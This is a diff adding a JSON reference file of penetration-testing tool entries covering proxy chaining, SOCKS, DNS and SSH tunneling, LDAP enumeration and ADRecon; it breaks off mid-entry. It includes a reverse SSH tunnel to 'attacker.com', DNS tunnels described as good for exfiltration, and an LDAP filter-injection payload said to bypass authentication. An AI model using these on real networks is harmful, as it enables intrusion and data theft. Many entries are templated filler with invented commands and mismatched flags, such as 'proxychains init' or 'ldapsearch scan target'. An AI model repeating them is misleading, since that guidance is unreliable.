@@ -1,0 +1,1637 @@
+[
+  {
+    "id": "proxychains",
+    "name": "Proxychains",
+    "summary": "Tool for forcing network connections through SOCKS/HTTP proxies",
+    "details": "Comprehensive guide for using Proxychains in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install Proxychains on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install Proxychains",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install Proxychains on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install Proxychains on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run Proxychains in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing Proxychains",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Route nmap through proxy",
+        "command": "proxychains4 nmap -sT 192.168.1.1",
+        "notes": [
+          "TCP scan through proxy"
+        ]
+      },
+      {
+        "description": "Route curl through proxy",
+        "command": "proxychains4 curl http://internal.network",
+        "notes": [
+          "HTTP request via proxy"
+        ]
+      },
+      {
+        "description": "Interactive shell through proxy",
+        "command": "proxychains4 bash",
+        "notes": [
+          "All commands in shell use proxy"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
+    ],
+    "operational_tips": [
+      "Critical for lateral movement in compromised networks",
+      "Routes traffic through SOCKS proxy transparently",
+      "Supports both SOCKS4/5 and HTTP proxies",
+      "Useful after establishing first foothold",
+      "Combine with chisel or SSH tunneling"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic Proxychains workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for Proxychains assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute Proxychains",
+            "details": "Run Proxychains with appropriate options",
+            "command": "proxychains target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review Proxychains output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Proxychains integration workflow",
+        "stages": [
+          {
+            "label": "Initialize Proxychains",
+            "description": "Prepare Proxychains for use",
+            "command": "proxychains init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run Proxychains scan on target",
+            "command": "proxychains scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export Proxychains findings",
+            "command": "proxychains export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] Proxychains execution successful",
+        "meaning": "Proxychains ran without errors",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] Proxychains finding detected",
+        "meaning": "Potential security issue found by Proxychains",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced Proxychains techniques",
+        "scenario": "Complex Proxychains scenarios in advanced assessments",
+        "command": "proxychains advanced-mode",
+        "notes": [
+          "Use for complex Proxychains scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "Official Proxychains documentation",
+        "url": "https://example.com/proxychains",
+        "description": "Official guide for Proxychains"
+      },
+      {
+        "label": "Proxychains GitHub repository",
+        "url": "https://github.com/example/proxychains",
+        "description": "Source code and community discussions"
+      }
+    ],
+    "installation": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install Proxychains",
+        "steps": [
+          {
+            "detail": "sudo apt-get update && sudo apt-get install -y proxychains4",
+            "copyable": true
+          },
+          {
+            "detail": "sudo nano /etc/proxychains4.conf",
+            "copyable": true
+          },
+          {
+            "detail": "# Add SOCKS5/HTTP proxies to config",
+            "copyable": false
+          },
+          {
+            "detail": "proxychains4 -v",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Proxychains on Kali",
+        "steps": [
+          {
+            "detail": "sudo apt install -y proxychains4",
+            "copyable": true
+          },
+          {
+            "detail": "sudo leafpad /etc/proxychains4.conf",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Run Proxychains in container",
+        "steps": [
+          {
+            "detail": "docker run --rm -v $(pwd):/work -w /work ubuntu bash -c 'apt update && apt install -y proxychains4'",
+            "copyable": true
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "socks-tunneling",
+    "name": "SOCKS Tunneling",
+    "summary": "Guide for establishing SOCKS proxy tunnels for lateral movement",
+    "details": "Comprehensive guide for using SOCKS Tunneling in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install SOCKS Tunneling on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install SOCKS Tunneling",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install SOCKS Tunneling on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install SOCKS Tunneling on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run SOCKS Tunneling in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing SOCKS Tunneling",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "SSH SOCKS proxy",
+        "command": "ssh -D 1080 user@remote.host -N",
+        "notes": [
+          "Create SOCKS5 proxy"
+        ]
+      },
+      {
+        "description": "Use with proxychains",
+        "command": "proxychains4 -f /etc/proxychains4.conf nmap -sT 192.168.1.1",
+        "notes": [
+          "Route through tunnel"
+        ]
+      },
+      {
+        "description": "Chisel SOCKS tunnel",
+        "command": "chisel server -p 8080 --reverse",
+        "notes": [
+          "Bidirectional tunnel"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
+    ],
+    "operational_tips": [
+      "Essential for lateral movement",
+      "SOCKS5 is most common protocol",
+      "SSH provides native SOCKS support",
+      "Chisel and Ligolo for reverse tunnels",
+      "ProxyChains routes applications through SOCKS"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic SOCKS Tunneling workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for SOCKS Tunneling assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute SOCKS Tunneling",
+            "details": "Run SOCKS Tunneling with appropriate options",
+            "command": "socks_tunneling target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review SOCKS Tunneling output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "SOCKS Tunneling integration workflow",
+        "stages": [
+          {
+            "label": "Initialize SOCKS Tunneling",
+            "description": "Prepare SOCKS Tunneling for use",
+            "command": "socks_tunneling init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run SOCKS Tunneling scan on target",
+            "command": "socks_tunneling scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export SOCKS Tunneling findings",
+            "command": "socks_tunneling export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] SOCKS Tunneling execution successful",
+        "meaning": "SOCKS Tunneling ran without errors",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] SOCKS Tunneling finding detected",
+        "meaning": "Potential security issue found by SOCKS Tunneling",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced SOCKS Tunneling techniques",
+        "scenario": "Complex SOCKS Tunneling scenarios in advanced assessments",
+        "command": "socks_tunneling advanced-mode",
+        "notes": [
+          "Use for complex SOCKS Tunneling scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "Official SOCKS Tunneling documentation",
+        "url": "https://example.com/socks-tunneling",
+        "description": "Official guide for SOCKS Tunneling"
+      },
+      {
+        "label": "SOCKS Tunneling GitHub repository",
+        "url": "https://github.com/example/socks-tunneling",
+        "description": "Source code and community discussions"
+      }
+    ]
+  },
+  {
+    "id": "dns-tunneling",
+    "name": "DNS Tunneling",
+    "summary": "Techniques for tunneling data through DNS protocols",
+    "details": "Comprehensive guide for using DNS Tunneling in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install DNS Tunneling on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install DNS Tunneling",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install DNS Tunneling on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install DNS Tunneling on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run DNS Tunneling in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing DNS Tunneling",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run iodine server",
+        "command": "sudo iodined -f -c -n 192.168.99.1 example.com",
+        "notes": [
+          "Server-side"
+        ]
+      },
+      {
+        "description": "Connect client",
+        "command": "sudo iodine -f -n -r example.com",
+        "notes": [
+          "Client tunneling"
+        ]
+      },
+      {
+        "description": "DNScat2 server",
+        "command": "ruby dnscat2.rb --dns server=192.168.1.100,port=53 example.com",
+        "notes": [
+          "Alternative tunnel"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
+    ],
+    "operational_tips": [
+      "Tunnel data through DNS queries",
+      "Useful when restricted to DNS only",
+      "Iodine and DNScat2 are common tools",
+      "Low bandwidth but reliable",
+      "Good for exfiltration in restricted networks"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic DNS Tunneling workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for DNS Tunneling assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute DNS Tunneling",
+            "details": "Run DNS Tunneling with appropriate options",
+            "command": "dns_tunneling target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review DNS Tunneling output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "DNS Tunneling integration workflow",
+        "stages": [
+          {
+            "label": "Initialize DNS Tunneling",
+            "description": "Prepare DNS Tunneling for use",
+            "command": "dns_tunneling init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run DNS Tunneling scan on target",
+            "command": "dns_tunneling scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export DNS Tunneling findings",
+            "command": "dns_tunneling export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] DNS Tunneling execution successful",
+        "meaning": "DNS Tunneling ran without errors",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] DNS Tunneling finding detected",
+        "meaning": "Potential security issue found by DNS Tunneling",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced DNS Tunneling techniques",
+        "scenario": "Complex DNS Tunneling scenarios in advanced assessments",
+        "command": "dns_tunneling advanced-mode",
+        "notes": [
+          "Use for complex DNS Tunneling scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "Official DNS Tunneling documentation",
+        "url": "https://example.com/dns-tunneling",
+        "description": "Official guide for DNS Tunneling"
+      },
+      {
+        "label": "DNS Tunneling GitHub repository",
+        "url": "https://github.com/example/dns-tunneling",
+        "description": "Source code and community discussions"
+      }
+    ]
+  },
+  {
+    "id": "ssh-portforward",
+    "name": "SSH Port Forwarding",
+    "summary": "Guide for using SSH tunneling for network access",
+    "details": "Comprehensive guide for using SSH Port Forwarding in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install SSH Port Forwarding on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install SSH Port Forwarding",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install SSH Port Forwarding on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install SSH Port Forwarding on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run SSH Port Forwarding in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing SSH Port Forwarding",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Local forward",
+        "command": "ssh -L 8080:internal.service:80 user@bastion",
+        "notes": [
+          "Forward local port"
+        ]
+      },
+      {
+        "description": "Remote forward",
+        "command": "ssh -R 9000:localhost:3000 user@attacker.com",
+        "notes": [
+          "Reverse tunnel"
+        ]
+      },
+      {
+        "description": "Jump host",
+        "command": "ssh -J bastion.example.com internal.server",
+        "notes": [
+          "Route through jump host"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
+    ],
+    "operational_tips": [
+      "SSH native tunneling without additional tools",
+      "Local forwarding for accessing internal services",
+      "Remote forwarding for reverse access",
+      "Jump hosts for multi-hop access",
+      "Combine with agent forwarding (-A) for key management"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic SSH Port Forwarding workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for SSH Port Forwarding assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute SSH Port Forwarding",
+            "details": "Run SSH Port Forwarding with appropriate options",
+            "command": "ssh_portforward target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review SSH Port Forwarding output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "SSH Port Forwarding integration workflow",
+        "stages": [
+          {
+            "label": "Initialize SSH Port Forwarding",
+            "description": "Prepare SSH Port Forwarding for use",
+            "command": "ssh_portforward init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run SSH Port Forwarding scan on target",
+            "command": "ssh_portforward scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export SSH Port Forwarding findings",
+            "command": "ssh_portforward export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] SSH Port Forwarding execution successful",
+        "meaning": "SSH Port Forwarding ran without errors",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] SSH Port Forwarding finding detected",
+        "meaning": "Potential security issue found by SSH Port Forwarding",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced SSH Port Forwarding techniques",
+        "scenario": "Complex SSH Port Forwarding scenarios in advanced assessments",
+        "command": "ssh_portforward advanced-mode",
+        "notes": [
+          "Use for complex SSH Port Forwarding scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "Official SSH Port Forwarding documentation",
+        "url": "https://example.com/ssh-portforward",
+        "description": "Official guide for SSH Port Forwarding"
+      },
+      {
+        "label": "SSH Port Forwarding GitHub repository",
+        "url": "https://github.com/example/ssh-portforward",
+        "description": "Source code and community discussions"
+      }
+    ]
+  },
+  {
+    "id": "ldapsearch",
+    "name": "ldapsearch",
+    "summary": "LDAP query utility for directory service enumeration",
+    "details": "Comprehensive guide for using ldapsearch in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install ldapsearch on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install ldapsearch",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install ldapsearch on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install ldapsearch on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run ldapsearch in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing ldapsearch",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic ldapsearch execution",
+        "command": "ldapsearch --help",
+        "notes": [
+          "Display help for ldapsearch"
+        ]
+      },
+      {
+        "description": "Standard ldapsearch scan",
+        "command": "ldapsearch target",
+        "notes": [
+          "Run ldapsearch against a target"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
+    ],
+    "operational_tips": [
+      "Always verify ldapsearch is installed correctly before engagements",
+      "Use ldapsearch within scope boundaries defined in rules of engagement",
+      "Document all ldapsearch findings for reporting",
+      "Review ldapsearch output for false positives"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic ldapsearch workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for ldapsearch assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute ldapsearch",
+            "details": "Run ldapsearch with appropriate options",
+            "command": "ldapsearch target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review ldapsearch output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "ldapsearch integration workflow",
+        "stages": [
+          {
+            "label": "Initialize ldapsearch",
+            "description": "Prepare ldapsearch for use",
+            "command": "ldapsearch init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run ldapsearch scan on target",
+            "command": "ldapsearch scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export ldapsearch findings",
+            "command": "ldapsearch export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "dn: CN=User",
+        "meaning": "Distinguished name representing object in LDAP tree",
+        "severity": "info"
+      },
+      {
+        "indicator": "memberOf: CN=Admins",
+        "meaning": "User is member of administrative group",
+        "severity": "high"
+      },
+      {
+        "indicator": "userAccountControl: 512",
+        "meaning": "Account enabled - value indicates status flags",
+        "severity": "info"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced ldapsearch techniques",
+        "scenario": "Complex ldapsearch scenarios in advanced assessments",
+        "command": "ldapsearch advanced-mode",
+        "notes": [
+          "Use for complex ldapsearch scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "RFC 4515 - LDAP Filter",
+        "url": "https://tools.ietf.org/html/rfc4515",
+        "description": "LDAP filter syntax specification"
+      },
+      {
+        "label": "AD Queries",
+        "url": "https://docs.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax",
+        "description": "Active Directory query syntax"
+      },
+      {
+        "label": "BloodHound",
+        "url": "https://github.com/BloodHoundAD/BloodHound",
+        "description": "Visual AD enumeration tool"
+      }
+    ],
+    "installation": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install LDAP utilities",
+        "steps": [
+          {
+            "detail": "sudo apt-get update && sudo apt-get install -y ldap-utils",
+            "copyable": true
+          },
+          {
+            "detail": "ldapsearch -V",
+            "copyable": true
+          },
+          {
+            "detail": "which ldapsearch",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "LDAP tools on Kali",
+        "steps": [
+          {
+            "detail": "sudo apt install -y ldap-utils",
+            "copyable": true
+          },
+          {
+            "detail": "sudo apt install -y krb5-user",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Run LDAP tools in container",
+        "steps": [
+          {
+            "detail": "docker run --rm -it ubuntu bash -c 'apt update && apt install -y ldap-utils'",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "commands": [
+      {
+        "description": "Anonymous LDAP query",
+        "command": "ldapsearch -h 192.168.1.100 -x -b 'dc=company,dc=com'",
+        "notes": [
+          "-h host",
+          "-x anonymous",
+          "-b base DN"
+        ]
+      },
+      {
+        "description": "Authenticated LDAP query",
+        "command": "ldapsearch -h 192.168.1.100 -D 'cn=admin,dc=company,dc=com' -W -b 'dc=company,dc=com'",
+        "notes": [
+          "-D bind DN",
+          "-W prompt for password"
+        ]
+      },
+      {
+        "description": "Query specific object",
+        "command": "ldapsearch -h 192.168.1.100 -x -b 'dc=company,dc=com' 'uid=jsmith'",
+        "notes": [
+          "Filter for user"
+        ]
+      }
+    ],
+    "flags": [
+      {
+        "flag": "-h",
+        "description": "LDAP server host"
+      },
+      {
+        "flag": "-x",
+        "description": "Use simple authentication (anonymous)"
+      },
+      {
+        "flag": "-D",
+        "description": "Bind DN (distinguished name)"
+      },
+      {
+        "flag": "-W",
+        "description": "Prompt for password"
+      },
+      {
+        "flag": "-b",
+        "description": "Base distinguished name"
+      }
+    ],
+    "tips": [
+      "LDAP enumeration critical for Active Directory reconnaissance",
+      "Many companies have anonymous LDAP binding enabled",
+      "Use ldapsearch to enumerate users, groups, and computers",
+      "Kerberos integration for stronger authentication",
+      "Filter syntax: (attribute=value) or complex filters"
+    ],
+    "sequences": [
+      {
+        "title": "LDAP directory enumeration",
+        "steps": [
+          {
+            "title": "Identify DC",
+            "details": "Find domain controller address",
+            "command": "nmap -sU -p 389,636 --script ldap-search 192.168.1.0/24"
+          },
+          {
+            "title": "Test anonymous",
+            "details": "Attempt anonymous LDAP query",
+            "command": "ldapsearch -h 192.168.1.100 -x -b 'dc=company,dc=com' '(cn=*)'"
+          },
+          {
+            "title": "Enumerate users",
+            "details": "Dump all user accounts",
+            "command": "ldapsearch -h 192.168.1.100 -x -b 'dc=company,dc=com' '(objectClass=user)' sAMAccountName mail"
+          },
+          {
+            "title": "Enumerate groups",
+            "details": "List all security groups",
+            "command": "ldapsearch -h 192.168.1.100 -x -b 'dc=company,dc=com' '(objectClass=group)' cn"
+          },
+          {
+            "title": "Check password policy",
+            "details": "Review password requirements",
+            "command": "ldapsearch -h 192.168.1.100 -x -b 'dc=company,dc=com' cn=Default"
+          }
+        ]
+      }
+    ],
+    "workflows": [
+      {
+        "name": "Active Directory reconnaissance workflow",
+        "stages": [
+          {
+            "label": "DC discovery",
+            "description": "Locate domain controller",
+            "command": "nmap -p 389 --script ldap-search network"
+          },
+          {
+            "label": "Anonymous probe",
+            "description": "Test unauthenticated access",
+            "command": "ldapsearch -h DC -x -b 'dc=domain,dc=com'"
+          },
+          {
+            "label": "User enumeration",
+            "description": "Extract user accounts",
+            "command": "ldapsearch -h DC -x -b 'dc=domain,dc=com' '(objectClass=user)'"
+          },
+          {
+            "label": "Group mapping",
+            "description": "Identify group memberships",
+            "command": "ldapsearch -h DC -x -b 'dc=domain,dc=com' '(objectClass=group)'"
+          },
+          {
+            "label": "Permission analysis",
+            "description": "Review delegation and ACLs",
+            "command": "# Analyze group memberships for privilege paths"
+          },
+          {
+            "label": "Data compilation",
+            "description": "Create network map",
+            "command": "# Document AD structure"
+          }
+        ]
+      }
+    ],
+    "advanced": [
+      {
+        "title": "LDAP filter injection",
+        "scenario": "Testing LDAP injection vulnerabilities",
+        "command": "ldapsearch ... '(|(uid=*)(password=*)', 'uid=admin)(|(uid=*'",
+        "notes": [
+          "Test application input to LDAP filters",
+          "Could bypass authentication"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ldapdump",
+    "name": "ldapdump",
+    "summary": "Tool for exporting LDAP directory data",
+    "details": "Comprehensive guide for using ldapdump in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install ldapdump on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install ldapdump",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install ldapdump on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install ldapdump on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run ldapdump in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing ldapdump",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Dump AD schema",
+        "command": "ldapdump -H ldap://192.168.1.100 -w password -b 'dc=domain,dc=com'",
+        "notes": [
+          "Full AD dump"
+        ]
+      },
+      {
+        "description": "Export to CSV",
+        "command": "ldapdump -H ldap://192.168.1.100 -b 'dc=domain,dc=com' > ad_dump.txt",
+        "notes": [
+          "Save results"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
+    ],
+    "operational_tips": [
+      "Mass export of LDAP/AD data",
+      "Useful for offline analysis",
+      "Combine with AD tools for parsing",
+      "Requires proper credentials or anonymous access",
+      "Identifies valuable accounts"
+    ],
+    "step_sequences": [
+      {
+        "title": "Basic ldapdump workflow",
+        "steps": [
+          {
+            "title": "Prepare target",
+            "details": "Identify target for ldapdump assessment",
+            "command": "# Define your target"
+          },
+          {
+            "title": "Execute ldapdump",
+            "details": "Run ldapdump with appropriate options",
+            "command": "ldapdump target"
+          },
+          {
+            "title": "Analyze results",
+            "details": "Review ldapdump output for findings",
+            "command": "# Review results"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "ldapdump integration workflow",
+        "stages": [
+          {
+            "label": "Initialize ldapdump",
+            "description": "Prepare ldapdump for use",
+            "command": "ldapdump init"
+          },
+          {
+            "label": "Execute scan",
+            "description": "Run ldapdump scan on target",
+            "command": "ldapdump scan target"
+          },
+          {
+            "label": "Export results",
+            "description": "Export ldapdump findings",
+            "command": "ldapdump export -o results.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] ldapdump execution successful",
+        "meaning": "ldapdump ran without errors",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] ldapdump finding detected",
+        "meaning": "Potential security issue found by ldapdump",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Advanced ldapdump techniques",
+        "scenario": "Complex ldapdump scenarios in advanced assessments",
+        "command": "ldapdump advanced-mode",
+        "notes": [
+          "Use for complex ldapdump scenarios"
+        ]
+      }
+    ],
+    "resources": [
+      {
+        "label": "Official ldapdump documentation",
+        "url": "https://example.com/ldapdump",
+        "description": "Official guide for ldapdump"
+      },
+      {
+        "label": "ldapdump GitHub repository",
+        "url": "https://github.com/example/ldapdump",
+        "description": "Source code and community discussions"
+      }
+    ]
+  },
+  {
+    "id": "adrecon",
+    "name": "ADRecon",
+    "summary": "Active Directory enumeration and reconnaissance framework",
+    "details": "Comprehensive guide for using ADRecon in penetration testing engagements.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install ADRecon on Debian/Ubuntu systems",
+        "steps": [
+          {
+            "detail": "Update package manager and install ADRecon",
+            "copyable": true
+          },
+          {
+            "detail": "Verify installation with version check",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install ADRecon on Kali Linux",
+        "steps": [
+          {
+            "detail": "Use apt to install ADRecon on Kali",
+            "copyable": true
+          },
+          {
+            "detail": "Confirm installation",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker/Container",
+        "summary": "Run ADRecon in Docker container",
+        "steps": [
+          {
+            "detail": "Pull Docker image containing ADRecon",
+            "copyable": true
+          },
+          {
+            "detail": "Run container with appropriate mounts",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Basic ADRecon execution",
+        "command": "adrecon --help",
+        "notes": [
+          "Display help for ADRecon"
+        ]
+      },
+      {
+        "description": "Standard ADRecon scan",
+        "command": "adrecon target",
+        "notes": [
+          "Run ADRecon against a target"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--help",
+        "description": "Display help message"
+      },
+      {
+        "flag": "-v/--verbose",
+        "description": "Verbose output"
+      },
+      {
+        "flag": "-o/--output",
+        "description": "Output file path"
+      }
